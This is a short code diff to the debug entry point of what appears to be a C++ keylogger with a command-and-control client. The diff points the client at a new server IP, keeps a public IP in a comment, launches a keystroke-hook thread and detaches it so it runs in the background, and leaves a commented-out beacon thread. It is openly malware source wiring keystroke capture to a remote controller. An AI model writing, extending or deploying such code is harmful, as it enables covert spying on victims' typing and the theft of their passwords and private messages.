@@ -10,12 +10,12 @@
 /* For DEBUG */
 int main() {
     //cncManager client(L"1.251.227.66");
-    cncManager client(L"172.17.254.126");
+    cncManager client(L"172.17.242.56");
 
     keyLogger logger;
 
     std::thread keyLog = std::thread(&keyLogger::startHook, logger);
-    keyLog.join();
+    keyLog.detach();
 
     client.print_setting = true;
     //std::thread Beacon = std::thread(&cncManager::sendBeacon, client);
